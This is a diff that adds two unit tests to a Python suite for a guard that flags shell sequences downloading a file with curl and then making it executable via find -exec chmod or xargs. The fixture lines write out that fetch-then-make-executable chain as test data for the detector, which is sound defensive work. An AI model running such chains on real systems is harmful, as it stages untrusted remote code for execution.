@@ -990,6 +990,19 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                       ("run", "echo /tmp/p | chmod +x xargs\n"))
 
+    def test_an_option_before_the_starting_point_still_walks_it(self):
+        # `-H`/`-L`/`-P` precede the starting points and are not predicates;
+        # reading one as "no roots" reopens the form.
+        for option in ("-H", "-L", "-P"):
+            self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+                         ("run", r"find %s /tmp -name p -exec chmod +x {} \;"
+                                 % option + "\n"))
+
+    def test_a_find_with_no_starting_point_walks_the_working_directory(self):
+        # The commonest spelling of all: no root means `.`.
+        self.flagged(("get", "curl -sfL https://example.test/p -o p\n"),
+                     ("run", r"find -name p -exec chmod +x {} \;" "\n"))
+
     def test_a_find_over_another_tree_is_left_alone(self):
         self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                       ("run", r"find /opt -name p -exec chmod +x {} \;" "\n"))
